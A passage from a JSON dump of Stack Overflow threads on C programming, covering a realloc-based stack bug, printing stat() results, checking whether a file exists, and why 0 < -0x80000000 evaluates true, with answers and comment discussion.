"https://stackoverflow.com/questions/34183641/implementing-stack-using-dynamic-array", "title": "Implementing Stack using Dynamic Array", "body": "<p>I have implemented a Stack using dynamic array(implementing array doubling) but when the doubling happens for the second time, I am getting runtime error! What's going wrong with the implementation? Please help.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Stack {\n    int *arr;\n    int top,size,capacity;\n};\n\nstruct Stack *createStack(int capacity) {\n    struct Stack *s = (struct Stack*)malloc(sizeof(struct Stack));\n    s-&gt;arr = (int*)malloc(sizeof(int)*capacity);\n    s-&gt;top = -1;\n    s-&gt;capacity = capacity;\n    s-&gt;size = 0;\n    return s;\n}\n\nvoid doubleStack(struct Stack *s) {\n    s-&gt;capacity = s-&gt;capacity*2;\n    s-&gt;arr = realloc(s-&gt;arr,s-&gt;capacity);\n    printf(\"Array doubling happened successfully!\\n\");\n}\n\nint isFull(struct Stack *s) {\n    return s-&gt;size == s-&gt;capacity;\n}\n\nvoid push(struct Stack *s, int item) {\n    if(isFull(s))\n        doubleStack(s);\n\n    printf(\"%d pushed!\\n\",item);\n    s-&gt;arr[++(s-&gt;top)] = item;\n    s-&gt;size++;\n}\n\nint isEmpty(struct Stack *s) {\n    return s-&gt;size == 0;\n}\n\nvoid pop(struct Stack *s) {\n    if(isEmpty(s)) {\n        printf(\"Empty stack!\\n\");\n        return;\n    }\n\n    int item = s-&gt;arr[(s-&gt;top)--];\n    s-&gt;size--;\n    printf(\"%d popped!\\n\",item);\n}\n\nint main(void) {\n    struct Stack *s = createStack(2);\n    push(s,1);\n    push(s,2);\n    push(s,3);\n    push(s,4);\n    push(s,5);\n    pop(s);\n    pop(s);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "directory", "stat"], "comments": [{"owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "edited": false, "score": 1, "creation_date": 1449675929, "post_id": 34182995, "comment_id": 56112207, "body": "Do not do <code>scanf(&quot;%s)&quot;, &amp;dirToView);</code> and <code>scanf(&quot;%s)&quot;, &amp;fileToView);</code>, which do cause type mismatch and undefined behavior."}, {"owner": {"reputation": 75, "user_id": 2754717, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/oMOqJ.jpg?s=128&g=1", "display_name": "4oursword", "link": "https://stackoverflow.com/users/2754717/4oursword"}, "reply_to_user": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "edited": false, "score": 0, "creation_date": 1449676111, "post_id": 34182995, "comment_id": 56112336, "body": "What is the correct type in this case? Is there a directory type?"}, {"owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "edited": false, "score": 0, "creation_date": 1449676241, "post_id": 34182995, "comment_id": 56112438, "body": "Use <code>char dirToView [200]; scanf(&quot;%199s)&quot;, dirToView);</code> and <code>char fileToView [200]; scanf(&quot;%s)&quot;, fileToView);</code>"}], "answers": [{"tags": [], "owner": {"reputation": 39526, "user_id": 265804, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/156ef8708acdbf6a9ef76dad0d69609f?s=128&d=identicon&r=PG&f=1", "display_name": "Blagovest Buyukliev", "link": "https://stackoverflow.com/users/265804/blagovest-buyukliev"}, "is_accepted": false, "score": 2, "last_activity_date": 1473452576, "last_edit_date": 1473452576, "creation_date": 1449676176, "answer_id": 34183107, "question_id": 34182995, "link": "https://stackoverflow.com/questions/34182995/viewing-attributes-of-a-file-with-stat-c/34183107#34183107", "title": "Viewing attributes of a file with stat (C)", "body": "<p>The correct way to print integers of an unknown size is to use <code>%jd</code>/<code>%ju</code> with an intermediate cast to <code>intmax_t</code>/<code>uintmax_t</code>:</p>\n\n<pre><code>printf(\"File has inode number %jd and is called %s\\n\", \n    (intmax_t) next_entry_ptr -&gt;d_ino, next_entry_ptr-&gt;d_name);\n</code></pre>\n\n<p><code>intmax_t</code>/<code>uintmax_t</code> are defined as the largest integral signed/unsigned types that can represent the values of any other integral type.</p>\n\n<p>The cast essentially enlarges the integer to the maximum size and then allows you to match the format specifier and the type in a portable way.</p>\n"}, {"tags": [], "owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "is_accepted": false, "score": 0, "last_activity_date": 1449677139, "last_edit_date": 1449677139, "creation_date": 1449676414, "answer_id": 34183201, "question_id": 34182995, "link": "https://stackoverflow.com/questions/34182995/viewing-attributes-of-a-file-with-stat-c/34183201#34183201", "title": "Viewing attributes of a file with stat (C)", "body": "<p>You really should compile with all warnings &amp; debug info (<code>gcc -Wall -Wextra -g</code>  if using <a href=\"http://gcc.gnu.org/\" rel=\"nofollow\">GCC</a>) and read the documentation of functions like <a href=\"http://man7.org/linux/man-pages/man3/scanf.3.html\" rel=\"nofollow\">scanf(3)</a> &amp; <a href=\"http://man7.org/linux/man-pages/man2/stat.2.html\" rel=\"nofollow\">stat(2)</a>. Notice that both could fail and you should test that.</p>\n\n<p>You might try, instead of </p>\n\n<pre><code>/// BAD CODE\nchar* fileToView [200];\nprintf(\"Enter name of desired file\\n\");\nscanf(\"%s)\", &amp;fileToView);\nstat(fileToView, buf);\noff_t size = buf -&gt; st_size;\nprintf(\"Size = %ld \\n\", size);\n</code></pre>\n\n<p>Something better like:</p>\n\n<pre><code>char fileToView[200];\nmemset (fileToView, 0, sizeof(fileToView));\nprintf(\"Enter name of desired file:\\n\");\nif (scanf(\"%199s\", fileToView)&lt;=0) {\n   perror(\"scanf\"); exit(EXIT_FAILURE); }\nstruct stat mystat;\nmemset (&amp;mystat, 0, sizeof(mystat));\nif (stat(fileToView, &amp;mystat)) {\n  fprintf(stderr, \"stat '%s' failed: %s\\n\", fileToView, strerror(errno));\n  exit(EXIT_FAILURE);\n}\nprintf(\"for file '%s' size = %ld\\n\", fileToView, (long) mystat.st_size);\n</code></pre>\n\n<p>Notice that I am testing success of <code>scanf</code>; I am limiting to 199 the name input (and <code>%s</code>  won't accept any space, because it stops scanning at them); I am allocating the <code>mystat</code> as a local variable (no need to heap-allocate it), and I am testing against failure of <code>stat</code>; your <code>fileToView</code>  was incorrectly declared as an array of 200 pointers to <code>char</code>. I also have the habit to zero all local variables.</p>\n\n<p>BTW, you could try to <a href=\"http://man7.org/linux/man-pages/man1/strace.1.html\" rel=\"nofollow\">strace(1)</a> your program. You'll understand what <a href=\"https://en.wikipedia.org/wiki/System_call\" rel=\"nofollow\">system calls</a> it is doing.</p>\n"}], "owner": {"reputation": 75, "user_id": 2754717, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/oMOqJ.jpg?s=128&g=1", "display_name": "4oursword", "link": "https://stackoverflow.com/users/2754717/4oursword"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 240, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1473452576, "creation_date": 1449675895, "last_edit_date": 1449680335, "question_id": 34182995, "link": "https://stackoverflow.com/questions/34182995/viewing-attributes-of-a-file-with-stat-c", "title": "Viewing attributes of a file with stat (C)", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;dirent.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;sys/types.h&gt;\n\n\nint main(int argc, char** argv) {\n\n    struct stat *buf;\n    buf = malloc(sizeof(struct stat)); \n\n    DIR * current_directory_ptr; /* DIR is a type from dirent.h */\n    struct dirent * next_entry_ptr; /* struct dirent is a type from dirent.h */\n\n    char* dirToView [200];\n\n    printf(\"Enter path of desired directory\\n\");\n    scanf(\"%s)\", &amp;dirToView);\n\n    current_directory_ptr = opendir(dirToView);\n\n    next_entry_ptr = readdir (current_directory_ptr);\n\n    while(next_entry_ptr != NULL){\n        printf(\"File has inode number %d and is called %s \\n\", \n             (int) next_entry_ptr -&gt;d_ino, next_entry_ptr-&gt;d_name);\n        next_entry_ptr=readdir(current_directory_ptr);\n\n    }\n\n    char* fileToView [200];\n    printf(\"Enter name of desired file\\n\");\n    scanf(\"%s)\", &amp;fileToView);\n\n\n\n    stat(fileToView, buf);\n    off_t size = buf -&gt; st_size;\n    printf(\"Size = %ld \\n\", size);\n\n    uid_t owner = buf -&gt;st_uid;\n    printf(\"owner = %d \\n\", owner);\n\n\n    closedir(current_directory_ptr);\n\n\n    return (EXIT_SUCCESS);\n}\n</code></pre>\n\n<p>The intent of this code is to use scan to obtain and output details of the chosen file. Opening a directory works, but when it comes to opening a file the result for both size and owner are 0 regardless of the actual values for that file. I believe the reason for this is that I am printf'ing them as the wrong type, but I am not certain of this. What is the correct system to output the result of stat()?</p>\n\n<p><strong>Edit for clarity</strong></p>\n\n<p>The issue lies with the lines highlighted below</p>\n\n<blockquote>\n<pre><code>   char* fileToView [200];\n   printf(\"Enter name of desired file\\n\");\n   scanf(\"%s)\", &amp;fileToView);\n\n   stat(fileToView, buf);\n   off_t size = buf -&gt; st_size;\n   printf(\"Size = %ld \\n\", size);\n\n   uid_t owner = buf -&gt;st_uid;\n  printf(\"owner = %d \\n\", owner);\n</code></pre>\n</blockquote>\n\n<p>Code earlier in the program functions as intended, at least one response has been referring to earlier lines. My apologies for any lack of clarity.</p>\n"}, {"tags": ["c", "fopen"], "comments": [{"owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "edited": false, "score": 0, "creation_date": 1449675851, "post_id": 34182951, "comment_id": 56112143, "body": "Neither of them is good because some file may not be opened even if it exists. For example, what if you don&#39;t have a permission to open it?"}, {"owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "edited": false, "score": 2, "creation_date": 1449675891, "post_id": 34182951, "comment_id": 56112178, "body": "Also, you should close opened files."}, {"owner": {"reputation": 86959, "user_id": 1735406, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/IF9uS.png?s=128&g=1", "display_name": "Maroun", "link": "https://stackoverflow.com/users/1735406/maroun"}, "edited": false, "score": 0, "creation_date": 1449675937, "post_id": 34182951, "comment_id": 56112215, "body": "My way, regardless of the programming language, is to assume success and handle failure when necessary. Why to check and only then open? Try to open and know how to handle failures."}, {"owner": {"reputation": 657, "user_id": 3181432, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/5c77bc404fe32c5c44ee519e0477598f?s=128&d=identicon&r=PG&f=1", "display_name": "MeChris", "link": "https://stackoverflow.com/users/3181432/mechris"}, "reply_to_user": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "edited": false, "score": 0, "creation_date": 1449675959, "post_id": 34182951, "comment_id": 56112235, "body": "@MikeCAT Okay, is there any way to check if the file is there without opening it?  I forgot to add that line! Thanks! :)"}, {"owner": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/233d38e551f3f0f85437e4ae47353d25?s=128&d=identicon&r=PG&f=1", "display_name": "Ian Abbott", "link": "https://stackoverflow.com/users/5264491/ian-abbott"}, "edited": false, "score": 0, "creation_date": 1449677441, "post_id": 34182951, "comment_id": 56113312, "body": "For POSIX, you can use the <code>stat</code> function."}], "owner": {"reputation": 657, "user_id": 3181432, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/5c77bc404fe32c5c44ee519e0477598f?s=128&d=identicon&r=PG&f=1", "display_name": "MeChris", "link": "https://stackoverflow.com/users/3181432/mechris"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 78, "favorite_count": 0, "closed_date": 1449676321, "answer_count": 0, "score": 0, "last_activity_date": 1449676303, "creation_date": 1449675778, "question_id": 34182951, "link": "https://stackoverflow.com/questions/34182951/c-way-to-check-if-file-exists", "closed_reason": "Duplicate", "title": "C way to check if file exists", "body": "<p>I have question about checking if file exists or not.\nWhich option is better?</p>\n\n<pre><code>source=fopen(\"text.txt\",\"r\");\nif(source != NULL)\n{\n    printf(\"File Exists!\\n\");\n    exit(0);\n}\n</code></pre>\n\n<p>or to use</p>\n\n<pre><code>if (source)\n{\n    printf(\"File Exists!\\n\");\n    exit(0);\n}\n</code></pre>\n"}, {"tags": ["c", "signed", "numeric-limits", "numeric-conversion"], "comments": [{"owner": {"reputation": 21714, "user_id": 1392132, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/QF6FZ.jpg?s=128&g=1", "display_name": "5gon12eder", "link": "https://stackoverflow.com/users/1392132/5gon12eder"}, "edited": false, "score": 3, "creation_date": 1449675449, "post_id": 34182672, "comment_id": 56111804, "body": "How much is <code>CHAR_BIT * sizeof(int)</code>?"}, {"owner": {"reputation": 533, "user_id": 5613000, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d21885cdf3eab3a31152c12315051c78?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan Fitzpatrick", "link": "https://stackoverflow.com/users/5613000/ryan-fitzpatrick"}, "edited": false, "score": 1, "creation_date": 1449675596, "post_id": 34182672, "comment_id": 56111919, "body": "Have you tried printing out bal?"}, {"owner": {"reputation": 33896, "user_id": 1611055, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/7e0a298478afff848f791de8fcbcbc7e?s=128&d=identicon&r=PG", "display_name": "Andreas Fester", "link": "https://stackoverflow.com/users/1611055/andreas-fester"}, "edited": false, "score": 10, "creation_date": 1449675662, "post_id": 34182672, "comment_id": 56111971, "body": "IMHO the more interesting thing is that it is true <i>only</i> for <code>-0x80000000</code>, but false for <code>-0x80000000L</code>, <code>-2147483648</code> and <code>-2147483648L</code> (gcc 4.1.2), so the question is: why is the int literal  <code>-0x80000000</code> different from the int literal  <code>-2147483648</code>?"}, {"owner": {"reputation": 19948, "user_id": 3150853, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/qIPrg.jpg?s=128&g=1", "display_name": "Jayesh Bhoi", "link": "https://stackoverflow.com/users/3150853/jayesh-bhoi"}, "reply_to_user": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 2, "creation_date": 1449675742, "post_id": 34182672, "comment_id": 56112039, "body": "@Bathsheba I just running program on online compiler <a href=\"http://www.tutorialspoint.com/codingground.htm\" rel=\"nofollow noreferrer\">tutorialspoint.com/codingground.htm</a>"}, {"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "edited": false, "score": 2, "creation_date": 1449687118, "post_id": 34182672, "comment_id": 56119765, "body": "If you&#39;ve ever noticed that (some incarnations of) <code>&lt;limits.h&gt;</code> defines <code>INT_MIN</code> as <code>(-2147483647 - 1)</code>, now you know why."}, {"owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "edited": false, "score": 0, "creation_date": 1449723520, "post_id": 34182672, "comment_id": 56134060, "body": "similar: <a href=\"http://stackoverflow.com/q/11536389/995714\">Casting minimum 32-bit integer (-2147483648) to float gives positive number (2147483648.0)</a>, <a href=\"http://stackoverflow.com/q/12620753/995714\">Why it is different between -2147483648 and (int)-2147483648</a>, <a href=\"http://stackoverflow.com/q/8511598/995714\">large negative integer literals</a>"}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1449726196, "post_id": 34182672, "comment_id": 56134929, "body": "Modern compilers warn about <code>-0x80000000</code>"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "edited": false, "score": 0, "creation_date": 1449818808, "post_id": 34182672, "comment_id": 56180483, "body": "@L\u01b0uV\u0129nhPh&#250;c On a standard 32 bit system that supposed duplicate will print &quot;success&quot; just as expected. As opposed to this question which will print &quot;failed&quot;, which was not expected. The difference is that the post you linked uses a signed long long literal, instead of an unsigned int literal."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "edited": false, "score": 0, "creation_date": 1449819483, "post_id": 34182672, "comment_id": 56180801, "body": "@L\u01b0uV\u0129nhPh&#250;c I think C++ is actually far behind C here, since C had a long long type which guaranteed at least 64 bits back in 1999, but C++ doesn&#39;t seem have gotten one until 2011? Meaning that C and C++ would have displayed different results until C++11."}, {"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1449847942, "post_id": 34182672, "comment_id": 56197953, "body": "@Lundin The <i>first</i> edition of the C++ standard (C++1998) was published only one year before the <i>second</i> edition of the C standard (C1999).  I guess WG21 saw no particular hurry about putting out a second edition of C++, despite the significant revisions in C99 that it would have been nice to have uplifted.  Looking back from 2015, that was probably a mistake."}, {"owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "edited": false, "score": 0, "creation_date": 1449913195, "post_id": 34182672, "comment_id": 56219264, "body": "<a href=\"http://stackoverflow.com/q/27052602/995714\">Why is 1 not greater than -0x80000000</a>"}], "answers": [{"tags": [], "owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "is_accepted": false, "score": 27, "last_activity_date": 1449676653, "last_edit_date": 1449676653, "creation_date": 1449675743, "answer_id": 34182933, "question_id": 34182672, "link": "https://stackoverflow.com/questions/34182672/why-is-0-0x80000000/34182933#34182933", "title": "Why is 0 &lt; -0x80000000?", "body": "<p><code>0x80000000</code> is an <code>unsigned</code> literal with value 2147483648.</p>\n\n<p>Applying the unary minus on this <em>still</em> gives you an unsigned type with a non-zero value. (In fact, for a non-zero value <code>x</code>, the value you end up with is <code>UINT_MAX - x + 1</code>.)</p>\n"}, {"comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1449676434, "post_id": 34182943, "comment_id": 56112580, "body": "This supposes 32-bit <code>int</code>s.  Although that&#39;s a very common choice, in any given implementation <code>int</code> might be either narrower or wider.  It is a correct analysis for that case, however."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1449726703, "post_id": 34182943, "comment_id": 56135118, "body": "This isn&#39;t relevant to OP&#39;s code, <code>-0x80000000</code> is unsigned arithmetic. <code>~0x800000000</code> is different code."}, {"owner": {"reputation": 7099, "user_id": 1475548, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/09sbK.jpg?s=128&g=1", "display_name": "Octopus", "link": "https://stackoverflow.com/users/1475548/octopus"}, "reply_to_user": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1449778000, "post_id": 34182943, "comment_id": 56165613, "body": "This seems to be the best and correct answer to me simply put. @M.M. he is explaining how to take a twos complement. This answer specifically addresses what the negative sign is doing to the number."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "reply_to_user": {"reputation": 7099, "user_id": 1475548, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/09sbK.jpg?s=128&g=1", "display_name": "Octopus", "link": "https://stackoverflow.com/users/1475548/octopus"}, "edited": false, "score": 0, "creation_date": 1449778321, "post_id": 34182943, "comment_id": 56165792, "body": "@Octopus the negative sign is <i>not</i> applying 2&#39;s complement to the number (!)  Although this seems clear, it&#39;s not describing what happens in the code <code>-0x80000000</code> !  In fact 2&#39;s complement is irrelevant to this question entirely."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 12, "last_activity_date": 1449676083, "last_edit_date": 1449676083, "creation_date": 1449675762, "answer_id": 34182943, "question_id": 34182672, "link": "https://stackoverflow.com/questions/34182672/why-is-0-0x80000000/34182943#34182943", "title": "Why is 0 &lt; -0x80000000?", "body": "<p>The numeric constant <code>0x80000000</code> is of type <code>unsigned int</code>.  If we take <code>-0x80000000</code> and do 2s compliment math on it, we get this:</p>\n\n<pre><code>~0x80000000 = 0x7FFFFFFF\n0x7FFFFFFF + 1 = 0x80000000\n</code></pre>\n\n<p>So <code>-0x80000000 == 0x80000000</code>.  And comparing <code>(0 &lt; 0x80000000)</code> (since <code>0x80000000</code> is unsigned) is true.</p>\n"}, {"tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": false, "score": 23, "last_activity_date": 1449676686, "last_edit_date": 1449676686, "creation_date": 1449675865, "answer_id": 34182979, "question_id": 34182672, "link": "https://stackoverflow.com/questions/34182672/why-is-0-0x80000000/34182979#34182979", "title": "Why is 0 &lt; -0x80000000?", "body": "<p>This integer literal <code>0x80000000</code> has type <code>unsigned int</code>. </p>\n\n<p>According to the C Standard (6.4.4.1 Integer constants)</p>\n\n<blockquote>\n  <p>5 The type of an integer constant is the first of the corresponding\n  list in which its value can be represented.</p>\n</blockquote>\n\n<p>And this integer constant can be represented by the type of <code>unsigned int</code>.</p>\n\n<p>So this expression</p>\n\n<p><code>-0x80000000</code> has the same <code>unsigned int</code> type. Moreover it has the same value\n<code>0x80000000</code> in the two's complement representation that calculates the following way</p>\n\n<pre><code>-0x80000000 = ~0x80000000 + 1 =&gt; 0x7FFFFFFF + 1 =&gt; 0x80000000\n</code></pre>\n\n<p>This has a side effect if to write for example</p>\n\n<pre><code>int x = INT_MIN;\nx = abs( x );\n</code></pre>\n\n<p>The result will be again <code>INT_MIN</code>.</p>\n\n<p>Thus in in this condition </p>\n\n<pre><code>bal &lt; INT32_MIN\n</code></pre>\n\n<p>there is compared <code>0</code> with <strong>unsigned</strong> value <code>0x80000000</code> converted to type long long int according to the rules of the usual arithmetic conversions. </p>\n\n<p>It is evident that 0 is less than <code>0x80000000</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 3, "creation_date": 1449677140, "post_id": 34183176, "comment_id": 56113113, "body": "&quot;... replace the literal with -2147483648L you explicitly get a long, which is signed.&quot;  Hmmm, In a 32-bit <code>long</code> system <code>2147483648L</code>, will not fit in a <code>long</code>, so it becomes <code>long long</code>, <i>then</i> the <code>-</code> is applied - or so I thought."}, {"owner": {"reputation": 28373, "user_id": 4926357, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3f559694d3ca65b39220166b865276d?s=128&d=identicon&r=PG&f=1", "display_name": "A.S.H", "link": "https://stackoverflow.com/users/4926357/a-s-h"}, "edited": false, "score": 0, "creation_date": 1449677263, "post_id": 34183176, "comment_id": 56113192, "body": "why cant <code>0x80000000</code> fit into an <code>int</code> on a 32 bit system??"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 28373, "user_id": 4926357, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3f559694d3ca65b39220166b865276d?s=128&d=identicon&r=PG&f=1", "display_name": "A.S.H", "link": "https://stackoverflow.com/users/4926357/a-s-h"}, "edited": false, "score": 2, "creation_date": 1449677701, "post_id": 34183176, "comment_id": 56113475, "body": "@A.S.H Because the maximum number an int can have is then <code>0x7FFFFFFF</code>. Try it yourself: <code>#include &lt;limits.h&gt;  printf(&quot;%X\\n&quot;, INT_MAX);</code>"}, {"owner": {"reputation": 28373, "user_id": 4926357, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3f559694d3ca65b39220166b865276d?s=128&d=identicon&r=PG&f=1", "display_name": "A.S.H", "link": "https://stackoverflow.com/users/4926357/a-s-h"}, "edited": false, "score": 0, "creation_date": 1449677870, "post_id": 34183176, "comment_id": 56113594, "body": "I know, it is the maximum <i>positive</i> number. the question is, when you specify a number in hex, does it <i>need</i> to be positive?"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 28373, "user_id": 4926357, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3f559694d3ca65b39220166b865276d?s=128&d=identicon&r=PG&f=1", "display_name": "A.S.H", "link": "https://stackoverflow.com/users/4926357/a-s-h"}, "edited": false, "score": 5, "creation_date": 1449678136, "post_id": 34183176, "comment_id": 56113761, "body": "@A.S.H Don&#39;t confuse hexadecimal representation of integer literals in source code with the underlying binary representation of a signed number. The literal <code>0x7FFFFFFF</code> when written in source code is always a positive number, but your <code>int</code> variable can of course contain raw binary numbers up to value 0xFFFFFFFF."}, {"owner": {"reputation": 28373, "user_id": 4926357, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3f559694d3ca65b39220166b865276d?s=128&d=identicon&r=PG&f=1", "display_name": "A.S.H", "link": "https://stackoverflow.com/users/4926357/a-s-h"}, "edited": false, "score": 0, "creation_date": 1449678733, "post_id": 34183176, "comment_id": 